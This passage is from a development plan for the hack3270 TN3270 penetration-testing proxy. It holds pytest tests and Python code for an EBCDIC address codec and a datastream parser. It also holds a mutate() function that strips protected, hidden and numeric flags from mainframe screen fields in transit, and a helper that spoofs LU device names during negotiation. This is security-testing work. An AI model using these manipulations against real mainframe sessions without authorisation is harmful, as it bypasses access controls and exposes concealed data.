ORD_EUA  = 0x12   # Erase Unprotected to Address — 2 addr bytes follow
ORD_GE   = 0x08   # Graphic Escape — 1 byte follows (treat as data)

_ORDERS = {ORD_SF, ORD_SFE, ORD_SBA, ORD_SA, ORD_MF, ORD_IC,
           ORD_PT, ORD_RA, ORD_EUA, ORD_GE}

# --- SF attribute byte bits (GA23-0059 §4.3.1, Figure 4-4) ---
# Bit numbering: bit 0 = LSB (0x01), bit 7 = MSB (0x80)
ATTR_PROTECTED  = 0x20   # bit 5
ATTR_NUMERIC    = 0x10   # bit 4
ATTR_DISPLAY    = 0x0C   # bits 3-2: 00=normal 01=normal 10=intense 11=non-display
ATTR_NONDISPLAY = 0x0C   # both bits set = hidden
ATTR_MDT        = 0x01   # bit 0 — Modified Data Tag

# --- SFE/MF attribute pair types (GA23-0059 §4.4.5) ---
XA_BASIC      = 0xC0   # basic 3270 attr (same bits as SF attr byte)
XA_HIGHLIGHT  = 0x41
XA_FG_COLOR   = 0x42
XA_BG_COLOR   = 0x45

# --- Telnet ---
IAC = 0xFF
EOR = 0xEF
IAC_EOR = bytes([IAC, EOR])

# --- TN3270E (RFC 2355) ---
TN3270E_HDR_LEN = 5
TN3270E_DT_3270_DATA = 0x00

# --- AID (Attention Identifier) values, GA23-0059 §3.5.6 ---
AID_TABLE = {
    "NO":     0x60,  "QREPLY": 0x61,  "ENTER":  0x7D,
    "PF1":    0xF1,  "PF2":    0xF2,  "PF3":    0xF3,  "PF4":  0xF4,
    "PF5":    0xF5,  "PF6":    0xF6,  "PF7":    0xF7,  "PF8":  0xF8,
    "PF9":    0xF9,  "PF10":   0x7A,  "PF11":   0x7B,  "PF12": 0x7C,
    "PF13":   0xC1,  "PF14":   0xC2,  "PF15":   0xC3,  "PF16": 0xC4,
    "PF17":   0xC5,  "PF18":   0xC6,  "PF19":   0xC7,  "PF20": 0xC8,
    "PF21":   0xC9,  "PF22":   0x4A,  "PF23":   0x4B,  "PF24": 0x4C,
    "PA1":    0x6C,  "PA2":    0x6E,  "PA3":    0x6B,
    "CLEAR":  0x6D,  "SYSREQ": 0xF0,  "SF":     0x88,  # 0x88 = structured field AID
}

# ===========================================================================
# 12-bit / 14-bit buffer address codec — GA23-0059 §4.3.3, Figure 4-2
# Lifted from hack3270_api.py:59-68 (ADDR_TABLE) and 776-810 (codec).
# Verified correct against the IBM doc — do not modify.
# ===========================================================================

ADDR_TABLE = bytes([
    0x40, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
])
# Reverse lookup for decode (built once at import)
_ADDR_REV = {b: i for i, b in enumerate(ADDR_TABLE)}


def decode_addr(b1: int, b2: int) -> int:
    """Decode a 12-bit or 14-bit buffer address.

    14-bit: top 2 bits of b1 are 00 → addr = ((b1 & 0x3F) << 8) | b2
    12-bit: anything else        → addr = (rev[b1] << 6) | rev[b2]
    """
    if (b1 & 0xC0) == 0x00:
        return ((b1 & 0x3F) << 8) | b2
    # 12-bit. Unknown bytes default to 0 (graceful degrade, not crash).
    high = _ADDR_REV.get(b1, 0)
    low = _ADDR_REV.get(b2, 0)
    return (high << 6) | low


def encode_addr(addr: int) -> bytes:
    """Encode a buffer position to 12-bit address bytes.

    Always uses 12-bit (works for screens up to 4095 cells = 51×80).
    14-bit needed only for >4095 — not implemented yet (model 5 = 27×132
    = 3564, still fits in 12-bit).
    """
    high = (addr >> 6) & 0x3F
    low = addr & 0x3F
    return bytes([ADDR_TABLE[high], ADDR_TABLE[low]])


def addr_to_rowcol(addr: int, cols: int = 80) -> tuple[int, int]:
    """Linear address → (row, col), 1-indexed."""
    return (addr // cols + 1, addr % cols + 1)


def rowcol_to_addr(row: int, col: int, cols: int = 80) -> int:
    """(row, col) 1-indexed → linear address."""
    return (row - 1) * cols + (col - 1)
```

- [ ] **Step 4: Run, verify 1a tests pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py -v -k "addr"
```

Expected: `9 passed`

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/tn3270_v2.py tests/test_tn3270_v2.py
git commit -m "feat(tn3270v2): address codec + datastream constants"
```

### Sub-task 1b: parse() — the state machine

- [ ] **Step 6: Write failing parser tests**

Append to `tests/test_tn3270_v2.py`:

```python
# ===========================================================================
# Sub-task 1b: parse() — golden-file driven
# ===========================================================================

@pytest.fixture
def tn3270():
    from hack3270_libs.tn3270_v2 import TN3270
    return TN3270()


def test_tn3270_implements_protocol(tn3270):
    from hackterm_core.protocol import Protocol
    assert isinstance(tn3270, Protocol)


def test_tn3270_class_attrs(tn3270):
    assert tn3270.name == "tn3270"
    assert tn3270.default_codepage == "cp037"
    assert "ENTER" in tn3270.aid_table
    assert tn3270.aid_table["ENTER"] == 0x7D


def test_parse_simple_sf(tn3270, gold):
    """One protected field containing 'ABC'."""
    screen = tn3270.parse(gold("simple_sf.bin"))
    assert isinstance(screen, Screen)
    assert screen.rows == 24
    assert screen.cols == 80
    assert len(screen.fields) == 1

    f = screen.fields[0]
    assert f.protected is True
    assert f.hidden is False
    assert f.numeric is False
    assert f.content == b"\xc1\xc2\xc3"   # raw EBCDIC "ABC"


def test_parse_simple_sf_rendered(tn3270, gold):
    """Rendered grid should show 'ABC' at the field's position.
    The SF order itself takes 1 buffer cell (the attribute byte lives
    in the buffer), so 'ABC' starts at position 1 (row 1, col 2)."""
    screen = tn3270.parse(gold("simple_sf.bin"))
    # rendered is rows×cols of single-char strings
    assert screen.rendered[0][1] == "A"
    assert screen.rendered[0][2] == "B"
    assert screen.rendered[0][3] == "C"


def test_parse_simple_sf_text_property(tn3270, gold):
    """Screen.text flattens the grid for regex matching."""
    screen = tn3270.parse(gold("simple_sf.bin"))
    assert "ABC" in screen.text


def test_parse_preserves_raw(tn3270, gold):
    """Screen.raw must be the original bytes — needed for replay."""
    raw = gold("simple_sf.bin")
    screen = tn3270.parse(raw)
    assert screen.raw == raw


def test_parse_sba_positioning(tn3270, gold):
    """SBA 40 40 → field at buffer addr 0, content starts at addr 1."""
    screen = tn3270.parse(gold("sba_positioned.bin"))
    assert len(screen.fields) == 1
    f = screen.fields[0]
    # SF was placed at addr 0, so field data starts at addr 1 → row 1, col 2
    assert f.row == 1
    assert f.col == 2


def test_parse_hidden_field(tn3270, gold):
    """Attr 0x6C: bits 3+2 both set = non-display."""
    screen = tn3270.parse(gold("hidden_field.bin"))
    assert len(screen.fields) == 1
    f = screen.fields[0]
    assert f.hidden is True
    assert f.protected is True
    # Content is still parsed (we need it for analysis), just hidden on render
    assert f.content == b"\xe2\xc5\xc3\xd9\xc5\xe3"  # "SECRET"


def test_parse_hidden_field_not_rendered(tn3270, gold):
    """Hidden field content does NOT appear in rendered grid."""
    screen = tn3270.parse(gold("hidden_field.bin"))
    assert "SECRET" not in screen.text


def test_parse_tn3270e_header_stripped(tn3270, gold):
    """5-byte TN3270E header is recognized and skipped before parsing.
    Header: 00 00 00 00 01 (data-type=3270-DATA, seq=1)."""
    screen = tn3270.parse(gold("tn3270e_wrapped.bin"))
    # Should produce same result as simple_sf.bin
    assert len(screen.fields) == 1
    assert screen.fields[0].content == b"\xc1\xc2\xc3"


def test_parse_tn3270e_header_recorded(tn3270, gold):
    """The parser remembers it saw a TN3270E header so build_inbound
    knows to prepend one on the reply."""
    tn3270.parse(gold("tn3270e_wrapped.bin"))
    assert tn3270.is_tn3270e is True


def test_parse_basic_tn3270_no_e_header(tn3270, gold):
    """A non-TN3270E packet should NOT set the flag."""
    tn3270.parse(gold("simple_sf.bin"))
    assert tn3270.is_tn3270e is False


def test_parse_sfe_extended(tn3270, gold):
    """SFE with 2 attribute pairs. Type 0xC0 carries the basic attr."""
    screen = tn3270.parse(gold("sfe_extended.bin"))
    assert len(screen.fields) == 1
    f = screen.fields[0]
    assert f.protected is True   # 0xC0 → 0x60 has bit 5 set
    assert f.content == b"\xc8\xc9"  # "HI"


def test_parse_iac_unescape(tn3270, gold):
    """0xFF 0xFF on the wire → single 0xFF in field content.
    This is the bug that breaks legacy parsers: they see 0xFF and
    either crash or treat it as IAC."""
    screen = tn3270.parse(gold("iac_escaped.bin"))
    assert len(screen.fields) == 1
    f = screen.fields[0]
    # Wire bytes were C1 FF FF C2 → content should be C1 FF C2
    assert f.content == b"\xc1\xff\xc2"
    assert len(f.content) == 3


def test_parse_multi_field(tn3270, gold):
    """Three fields. Verify lengths close correctly when next SF appears."""
    screen = tn3270.parse(gold("multi_field.bin"))
    assert len(screen.fields) == 3

    # Field 1: protected, "USER:"
    assert screen.fields[0].protected is True
    assert screen.fields[0].content == b"\xe4\xe2\xc5\xd9\x7a"
    assert screen.fields[0].length == 5

    # Field 2: unprotected, 8 spaces — this is the input field
    assert screen.fields[1].protected is False
    assert screen.fields[1].length == 8

    # Field 3: protected, "PASS:"
    assert screen.fields[2].protected is True
    assert screen.fields[2].content == b"\xd7\xc1\xe2\xe2\x7a"


def test_parse_multi_field_rendered_text(tn3270, gold):
    screen = tn3270.parse(gold("multi_field.bin"))
    assert "USER:" in screen.text
    assert "PASS:" in screen.text


def test_parse_ra_repeat(tn3270, gold):
    """RA fills buffer from current pos to target addr with one char.
    RA to addr 10 with '-' (0x60) starting from addr 0 → 10 dashes."""
    screen = tn3270.parse(gold("ra_repeat.bin"))
    # No fields (no SF), but rendered grid should show the dashes
    assert screen.rendered[0][0] == "-"
    assert screen.rendered[0][9] == "-"


def test_parse_no_false_positive_on_0x1d_in_text():
    """The big one. 0x1D in EBCDIC cp037 is a control char, but if it
    appears as a literal data byte (e.g. via GE or in a packet that
    doesn't start with a write command), the parser must NOT treat it
    as Start Field.

    Construct: write command + WCC + SF + GE 0x1D + more text.
    GE (0x08) means "next byte is a graphic, not an order"."""
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    pkt = bytes([
        0xF5, 0xC3,           # EW + WCC
        0x1D, 0x40,           # SF unprotected
        0xC1,                 # 'A'
        0x08, 0x1D,           # GE → next byte (0x1D) is GRAPHIC, not SF order
        0xC2,                 # 'B'
        0xFF, 0xEF,
    ])
    screen = p.parse(pkt)
    # Must be exactly ONE field — the GE'd 0x1D is data, not a second SF
    assert len(screen.fields) == 1
    # Content includes the 0x1D as a data byte
    assert b"\xc1\x1d\xc2" == screen.fields[0].content


def test_parse_empty_packet():
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    screen = p.parse(b"")
    assert screen.fields == []
    assert screen.rows == 24


def test_parse_just_iac_eor():
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    screen = p.parse(b"\xff\xef")
    assert screen.fields == []


def test_parse_unknown_write_command_returns_empty():
    """Garbage byte where write command should be → empty screen, no crash."""
    from hack3270_libs.tn3270_v2 import TN3270
    p = TN3270()
    screen = p.parse(b"\x99\x99\x99\xff\xef")
    assert isinstance(screen, Screen)
```

- [ ] **Step 7: Run, verify 1b tests fail**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py -v -k "parse or implements or class_attrs"
```

Expected: failures with `AttributeError` / `ImportError: cannot import name 'TN3270'`.

- [ ] **Step 8: Implement TN3270 class with parse()**

Append to `hack3270_libs/tn3270_v2.py`:

```python
# ===========================================================================
# Internal parser state — one instance per parse() call
# ===========================================================================

@dataclass
class _ParseState:
    """Mutable parser state. Lives for the duration of one parse() call."""
    addr: int = 0                    # current buffer address
    rows: int = 24
    cols: int = 80
    fields: list = None              # list[Field] — built incrementally
    grid: list = None                # rows × cols of single chars
    cur_field_content: bytearray = None
    cur_field_start: int = -1        # buffer addr where current field's DATA begins
    cur_field_attr: int = 0          # the attr byte of current field

    def __post_init__(self):
        if self.fields is None:
            self.fields = []
        if self.grid is None:
            self.grid = [[" "] * self.cols for _ in range(self.rows)]
        if self.cur_field_content is None:
            self.cur_field_content = bytearray()

    @property
    def screen_size(self) -> int:
        return self.rows * self.cols

    def advance(self, n: int = 1):
        """Advance buffer address with wraparound."""
        self.addr = (self.addr + n) % self.screen_size

    def put_char(self, ebcdic_byte: int, codec: EbcdicCodec, render: bool = True):
        """Write one char into the grid at current addr, advance, accumulate."""
        if render:
            r, c = addr_to_rowcol(self.addr, self.cols)
            ch = codec.to_ascii(bytes([ebcdic_byte]))
            # to_ascii returns '[0xNN]' for control bytes — show as space on screen
            self.grid[r - 1][c - 1] = ch if len(ch) == 1 else " "
        if self.cur_field_start >= 0:
            self.cur_field_content.append(ebcdic_byte)
        self.advance()

    def open_field(self, attr: int):
        """Close any open field, start a new one. SF attr byte occupies
        one buffer cell — the field's data starts at addr+1."""
        self.close_field()
        self.cur_field_attr = attr
        # The SF order's attr byte LIVES in the buffer at current addr.
        # Field data starts at the NEXT cell.
        self.advance()  # consume the cell holding the attr byte
        self.cur_field_start = self.addr
        self.cur_field_content = bytearray()

    def close_field(self):
        if self.cur_field_start < 0:
            return
        length = (self.addr - self.cur_field_start) % self.screen_size
        attr = self.cur_field_attr
        r, c = addr_to_rowcol(self.cur_field_start, self.cols)
        self.fields.append(Field(
            row=r, col=c, length=length,
            protected=bool(attr & ATTR_PROTECTED),
            hidden=(attr & ATTR_DISPLAY) == ATTR_NONDISPLAY,
            numeric=bool(attr & ATTR_NUMERIC),
            mdt=bool(attr & ATTR_MDT),
            content=bytes(self.cur_field_content),
        ))
        self.cur_field_start = -1
        self.cur_field_content = bytearray()


# ===========================================================================
# IAC un-escaping — must happen BEFORE the order parser sees the bytes
# ===========================================================================

def _strip_iac_eor(data: bytes) -> bytes:
    """Remove trailing IAC EOR if present."""
    if data.endswith(IAC_EOR):
        return data[:-2]
    return data


def _unescape_iac(data: bytes) -> bytes:
    """Telnet IAC escaping: 0xFF 0xFF on the wire → 0xFF in payload.
    A lone 0xFF (not doubled) is a real telnet command and should NOT
    appear here — the proxy frames on IAC EOR before we see this."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data) and data[i + 1] == IAC:
            out.append(IAC)
            i += 2
        else:
            out.append(data[i])
            i += 1
    return bytes(out)


def _strip_tn3270e_header(data: bytes) -> tuple[bytes, bool]:
    """If data starts with a TN3270E header, strip it and return (rest, True).
    Header is 5 bytes: data-type, request-flag, response-flag, seq-num(2).
    Heuristic: byte 0 is data-type and for 3270-DATA it's 0x00. The
    valid data-type values are 0x00-0x07 (RFC 2355 §5.2). A 3270 write
    command is always >= 0x01 (lowest is CMD_WRITE=0x01 in SNA encoding)
    and the wire usually shows 0xF1+. So data[0] == 0x00 and len >= 5
    and data[5] looking like a write command → header present."""
    if len(data) >= TN3270E_HDR_LEN + 1 and data[0] <= 0x07:
        # Peek past header — does it look like a datastream?
        peek = data[TN3270E_HDR_LEN]
        if peek in _HAS_WCC or peek == CMD_WSF or peek in (0x11, 0xF3, 0x6F):
            return data[TN3270E_HDR_LEN:], True
    return data, False


# ===========================================================================
# TN3270 — the Protocol implementation
# ===========================================================================

class TN3270(Protocol):
    name = "tn3270"
    aid_table = AID_TABLE
    default_codepage = "cp037"

    def __init__(self, codepage: str = "cp037"):
        self.codec = EbcdicCodec(codepage)
        self.is_tn3270e = False    # set by parse() when header seen
        self.last_seq = 0          # TN3270E sequence number for replies
        self.rows = 24
        self.cols = 80

    # --- Telnet negotiation layer ----------------------------------------

    def detect(self, first_bytes: bytes) -> bool:
        """Handshake complete when we see the first non-IAC byte from
        the server (i.e. actual datastream, not telnet negotiation).
        IAC = 0xFF. Everything in the negotiation phase starts with IAC."""
        # If there's any byte that ISN'T part of telnet negotiation,
        # we're past the handshake. Cheap heuristic: doesn't start with IAC.
        return len(first_bytes) > 0 and first_bytes[0] != IAC

    def negotiate_hook(self, data: bytes, direction: str,
                       opts: NegotiateOpts) -> bytes:
        """LU-name spoofing happens here. See attacks/negotiation.py
        for the splice logic — this method delegates."""
        if direction == "c2s" and opts.spoof_device_name:
            data = _splice_lu_name(data, opts.spoof_device_name)
        return data

    # --- Datastream layer (host → terminal) ------------------------------

    def parse(self, data: bytes) -> Screen:
        """Decode an outbound (host→terminal) datastream into a Screen.

        Pipeline: strip IAC EOR → strip TN3270E header → un-escape IAC
        → consume write command + WCC → walk orders.
        """
        original = data
        data = _strip_iac_eor(data)
        data, self.is_tn3270e = _strip_tn3270e_header(data)
        if self.is_tn3270e and len(original) >= 5:
            self.last_seq = (original[3] << 8) | original[4]
        data = _unescape_iac(data)

        st = _ParseState(rows=self.rows, cols=self.cols)

        if not data:
            return self._finish(st, original)

        # --- Consume write command + optional WCC ---
        i = 0
        cmd = data[0]
        if cmd in _HAS_WCC:
            i = 2  # skip cmd + WCC
        elif cmd == CMD_WSF or cmd == 0x11:
            # Write Structured Field — different beast, handled in
            # parse_structured(). Return empty Screen here.
            return self._finish(st, original)
        elif cmd in (CMD_ERASE_ALL_UNPROT, 0x0F, CMD_READ_BUFFER, 0x02,
                     CMD_READ_MOD, 0x06):
            i = 1  # these have no WCC and no order data
            return self._finish(st, original)
        else:
            # Unknown / not a datastream — bail gracefully
            return self._finish(st, original)

        # --- Walk orders ---
        n = len(data)
        while i < n:
            b = data[i]

            if b == ORD_SBA:
                if i + 2 < n:
                    st.addr = decode_addr(data[i+1], data[i+2])
                    i += 3
                else:
                    break

            elif b == ORD_SF:
                if i + 1 < n:
                    st.open_field(data[i+1])
                    i += 2
                else:
                    break

            elif b == ORD_SFE:
                if i + 1 < n:
                    count = data[i+1]
                    end = i + 2 + count * 2
                    if end <= n:
                        attr = 0x40  # default: bit 6 set, all else clear
                        for j in range(count):
                            t = data[i + 2 + j*2]
                            v = data[i + 3 + j*2]
                            if t == XA_BASIC:
                                attr = v
                        st.open_field(attr)
                        i = end
                    else:
                        break
                else:
                    break

            elif b == ORD_MF:
                # Modify Field — count + pairs. We don't track field
                # modification (only initial creation), so just skip.
                if i + 1 < n:
                    count = data[i+1]
                    i += 2 + count * 2
                else:
                    break

            elif b == ORD_SA:
                # Set Attribute — 2 bytes follow. Affects rendering of
                # subsequent chars but not field structure. Skip.
                i += 3

            elif b == ORD_IC:
                i += 1  # Insert Cursor — no operands, no buffer effect

            elif b == ORD_PT:
                i += 1  # Program Tab — advances to next unprotected field; skip

            elif b == ORD_RA:
                # Repeat to Address: 2 addr bytes + 1 char.
                # Fill from current addr to target with that char.
                if i + 3 < n:
                    target = decode_addr(data[i+1], data[i+2])
                    fill = data[i+3]
                    hide = (st.cur_field_attr & ATTR_DISPLAY) == ATTR_NONDISPLAY
                    # Wraparound-safe fill
                    while st.addr != target:
                        st.put_char(fill, self.codec, render=not hide)
                        if st.addr == st.cur_field_start:  # full wrap
                            break
                    i += 4
                else:
                    break

            elif b == ORD_EUA:
                # Erase Unprotected to Address — 2 addr bytes. Skip.
                i += 3

            elif b == ORD_GE:
                # Graphic Escape — next byte is data, NOT an order.
                # This is what stops 0x1D-in-text from false-positiving.
                if i + 1 < n:
                    hide = (st.cur_field_attr & ATTR_DISPLAY) == ATTR_NONDISPLAY
                    st.put_char(data[i+1], self.codec, render=not hide)
                    i += 2
                else:
                    break

            else:
                # Plain data byte — write to grid + accumulate in field
                hide = (st.cur_field_attr & ATTR_DISPLAY) == ATTR_NONDISPLAY
                st.put_char(b, self.codec, render=not hide)
                i += 1

        return self._finish(st, original)

    def _finish(self, st: _ParseState, original: bytes) -> Screen:
        st.close_field()
        return Screen(
            rows=st.rows, cols=st.cols,
            fields=st.fields, raw=original,
            rendered=st.grid,
        )


# ===========================================================================
# LU-name splice helper — used by negotiate_hook()
# Lives at module scope so attacks/negotiation.py can call it directly.
# ===========================================================================

# IAC SB TN3270E DEVICE-TYPE REQUEST ... [CONNECT <luname>] IAC SE
# ff  fa  28      02          07         01      ...        ff f0
_DEVTYPE_REQ_PREFIX = bytes([0xFF, 0xFA, 0x28, 0x02, 0x07])
_CONNECT = 0x01
_IAC_SE = bytes([0xFF, 0xF0])


def _splice_lu_name(data: bytes, new_name: str) -> bytes:
    """Find a DEVICE-TYPE REQUEST in the negotiation stream and rewrite
    its CONNECT <luname> portion. LU names are ASCII (telnet layer),
    NOT EBCDIC.

    Returns data unchanged if no DEVICE-TYPE REQUEST found.
    """
    idx = data.find(_DEVTYPE_REQ_PREFIX)
    if idx < 0:
        return data

    # Find IAC SE terminator
    end = data.find(_IAC_SE, idx)
    if end < 0:
        return data

    sub = data[idx:end]  # the SB...SE payload (excluding IAC SE)

    # Find CONNECT marker (0x01) inside the suboption
    # Layout: ff fa 28 02 07 <devtype-ascii> [01 <luname-ascii>]
    # Skip the 5-byte prefix, then look for 0x01
    body = sub[len(_DEVTYPE_REQ_PREFIX):]
    connect_pos = body.find(bytes([_CONNECT]))

    new_lu_bytes = new_name.encode("ascii")

    if connect_pos < 0:
        # No CONNECT clause — append one
        rebuilt = sub + bytes([_CONNECT]) + new_lu_bytes
    else:
        # Replace everything after CONNECT
        devtype = body[:connect_pos]
        rebuilt = (_DEVTYPE_REQ_PREFIX + devtype
                   + bytes([_CONNECT]) + new_lu_bytes)

    return data[:idx] + rebuilt + _IAC_SE + data[end + 2:]
```

- [ ] **Step 9: Run 1b tests, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py -v -k "parse or implements or class_attrs"
```

Expected: `22 passed`

If `test_parse_no_false_positive_on_0x1d_in_text` fails: the GE handler isn't consuming the next byte as data — verify the `i += 2` after `put_char`.

If `test_parse_iac_unescape` fails with `len(content) == 4`: the un-escape is running AFTER the order parser. It must run BEFORE — check the pipeline order in `parse()`.

- [ ] **Step 10: Commit**

```bash
git add hack3270_libs/tn3270_v2.py tests/test_tn3270_v2.py
git commit -m "feat(tn3270v2): state-machine parse() with golden-file tests"
```

### Sub-task 1c: mutate() — context-aware bit-flips

- [ ] **Step 11: Write failing mutate tests**

Append to `tests/test_tn3270_v2.py`:

```python
# ===========================================================================
# Sub-task 1c: mutate() — same flips as legacy manipulate(), context-aware
# ===========================================================================

def test_mutate_unprotect_clears_bit5(tn3270, gold):
    """unprotect=True clears bit 5 (0x20) of every SF attr byte."""
    opts = MutateOpts(unprotect=True)
    out = tn3270.mutate(gold("simple_sf.bin"), opts)
    # Original attr at offset 3 is 0x60 (0110 0000).
    # After clearing bit 5: 0x40 (0100 0000).
    assert out[3] == 0x40


def test_mutate_no_opts_is_noop(tn3270, gold):
    """All flags False → bytes unchanged."""
    opts = MutateOpts()
    raw = gold("simple_sf.bin")
    assert tn3270.mutate(raw, opts) == raw


def test_mutate_reveal_hidden_clears_display_bits(tn3270, gold):
    """reveal_hidden=True clears bits 3+2 (0x0C) when both set."""
    opts = MutateOpts(reveal_hidden=True)
    out = tn3270.mutate(gold("hidden_field.bin"), opts)
    # Original attr at offset 3 is 0x6C (0110 1100).
    # After clearing 0x0C: 0x60 (0110 0000).
    assert out[3] == 0x60


def test_mutate_remove_numeric_clears_bit4(tn3270):
    """Attr with bit 4 (numeric) set → cleared."""
    opts = MutateOpts(remove_numeric=True)
    pkt = bytes([0xF5, 0xC3, 0x1D, 0x50, 0xC1, 0xFF, 0xEF])  # 0x50 = bit6+bit4
    out = tn3270.mutate(pkt, opts)
    assert out[3] == 0x40  # bit 4 cleared


def test_mutate_preserves_iac_eor(tn3270, gold):
    """Mutation must not strip the trailing IAC EOR."""
    opts = MutateOpts(unprotect=True)
    out = tn3270.mutate(gold("simple_sf.bin"), opts)
    assert out.endswith(b"\xff\xef")


def test_mutate_preserves_tn3270e_header(tn3270, gold):
    """If a TN3270E header is present, mutation must keep it."""
    opts = MutateOpts(unprotect=True)
    out = tn3270.mutate(gold("tn3270e_wrapped.bin"), opts)
    assert out[:5] == bytes([0x00, 0x00, 0x00, 0x00, 0x01])
    # And the attr (now at offset 5+3=8) is flipped
    assert out[8] == 0x40


def test_mutate_does_not_flip_data_bytes(tn3270):
    """A 0x60 in field CONTENT must not be flipped — only SF attr bytes.
    This is the bug legacy manipulate() has."""
    opts = MutateOpts(unprotect=True)
    # SF attr=0x60, then content byte that ALSO happens to be 0x60 (EBCDIC '-')
    pkt = bytes([0xF5, 0xC3, 0x1D, 0x60, 0x60, 0x60, 0xFF, 0xEF])
    out = tn3270.mutate(pkt, opts)
    assert out[3] == 0x40   # SF attr flipped
    assert out[4] == 0x60   # data byte UNTOUCHED
    assert out[5] == 0x60   # data byte UNTOUCHED


def test_mutate_handles_sfe_basic_attr(tn3270, gold):
    """SFE attr pair with type 0xC0 gets the same bit-flip treatment."""
    opts = MutateOpts(unprotect=True)
    out = tn3270.mutate(gold("sfe_extended.bin"), opts)
    # In sfe_extended.bin: F5 C3 29 02 C0 60 42 F4 ...
    # Offset 5 is the value of the C0 pair (0x60). After unprotect: 0x40.
    assert out[5] == 0x40
    # The color pair (42 F4) at offsets 6-7 untouched
    assert out[6] == 0x42
    assert out[7] == 0xF4
```

- [ ] **Step 12: Implement mutate()**

Append to `hack3270_libs/tn3270_v2.py` (inside the `TN3270` class — add after `_finish`):

```python
    def mutate(self, data: bytes, opts: MutateOpts) -> bytes:
        """In-flight attribute manipulation.

        Walks the datastream the same way parse() does, but instead of
        building a Screen it surgically rewrites attr bytes in place.
        Same flips as legacy manipulate() (libhack3270.py:1240+) but
        context-aware: only flips bytes that are PROVABLY attr bytes.
        """
        if not any([opts.unprotect, opts.reveal_hidden,
                    opts.remove_numeric, opts.high_visibility,
                    opts.color_reveal]):
            return data

        out = bytearray(data)
        # Track absolute offsets so we can rewrite in `out` directly.
        # We DON'T strip headers/IAC here — we walk the original bytes
        # and skip past framing without removing it.

        i = 0
        n = len(out)

        # Skip TN3270E header
        if n >= TN3270E_HDR_LEN + 1 and out[0] <= 0x07:
            peek = out[TN3270E_HDR_LEN]
            if peek in _HAS_WCC or peek == CMD_WSF:
                i = TN3270E_HDR_LEN

        # Strip trailing IAC EOR from our walk range (don't remove from out)
        end = n
        if n >= 2 and out[n-2] == IAC and out[n-1] == EOR:
            end = n - 2

        if i >= end:
            return bytes(out)

        # Skip write command + WCC
        cmd = out[i]
        if cmd in _HAS_WCC:
            i += 2
        else:
            return bytes(out)  # not a mutable datastream

        def flip(attr: int) -> int:
            if opts.unprotect:
                attr &= ~ATTR_PROTECTED
            if opts.reveal_hidden and (attr & ATTR_DISPLAY) == ATTR_NONDISPLAY:
                attr &= ~ATTR_DISPLAY
            if opts.remove_numeric:
                attr &= ~ATTR_NUMERIC
            return attr

        while i < end:
            b = out[i]

            if b == IAC and i + 1 < end and out[i+1] == IAC:
                i += 2  # escaped IAC — skip both bytes (data context)

            elif b == ORD_SF:
                if i + 1 < end:
                    out[i+1] = flip(out[i+1])
                    i += 2
                else:
                    break

            elif b == ORD_SFE or b == ORD_MF:
                if i + 1 < end:
                    count = out[i+1]
                    j = i + 2
                    for _ in range(count):
                        if j + 1 < end:
                            if out[j] == XA_BASIC:
                                out[j+1] = flip(out[j+1])
                            j += 2
                    i = j
                else:
                    break

            elif b == ORD_SBA:
                i += 3
            elif b == ORD_SA:
                i += 3
            elif b == ORD_IC or b == ORD_PT:
                i += 1
            elif b == ORD_RA:
                i += 4
            elif b == ORD_EUA:
                i += 3
            elif b == ORD_GE:
                i += 2  # GE + 1 graphic byte — that byte is data, never an order
            else:
                i += 1  # data byte

        return bytes(out)
```

- [ ] **Step 13: Run mutate tests, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py -v -k mutate
```

Expected: `8 passed`

- [ ] **Step 14: Commit**

```bash
git add hack3270_libs/tn3270_v2.py tests/test_tn3270_v2.py
git commit -m "feat(tn3270v2): context-aware mutate() — only flips real attr bytes"
```

### Sub-task 1d: build_inbound() + spoof_aid()

- [ ] **Step 15: Write failing builder tests**

Append to `tests/test_tn3270_v2.py`:

```python
# ===========================================================================
# Sub-task 1d: build_inbound() + spoof_aid()
# ===========================================================================

def test_build_inbound_basic(tn3270):
    """AID + cursor(2) + IAC EOR. No fields = shortest valid inbound."""
    pkt = tn3270.build_inbound(aid=0x7D, cursor=(1, 1), fields=[])
    # Cursor (1,1) → addr 0 → encode → 0x40 0x40
    assert pkt == b"\x7d\x40\x40\xff\xef"


def test_build_inbound_with_field(tn3270):
    """One field: SBA + addr(2) + EBCDIC data."""
    pkt = tn3270.build_inbound(
        aid=0x7D, cursor=(1, 1),
        fields=[FieldWrite(row=1, col=2, data=b"\xc1\xc2\xc3")],
    )
    # row=1,col=2 → addr 1 → encode → ADDR_TABLE[0]=0x40, ADDR_TABLE[1]=0xC1
    # Layout: AID cursor(2) SBA addr(2) data IAC EOR
    assert pkt == b"\x7d\x40\x40\x11\x40\xc1\xc1\xc2\xc3\xff\xef"


def test_build_inbound_tn3270e_prepends_header(tn3270, gold):
    """If is_tn3270e is True (set by a prior parse()), prepend the
    5-byte TN3270E inbound header: 00 00 00 00 <seq-lo>."""
    tn3270.parse(gold("tn3270e_wrapped.bin"))   # sets is_tn3270e=True, last_seq=1
    pkt = tn3270.build_inbound(aid=0x7D, cursor=(1, 1), fields=[])
    assert pkt[:5] == bytes([0x00, 0x00, 0x00, 0x00, 0x01])
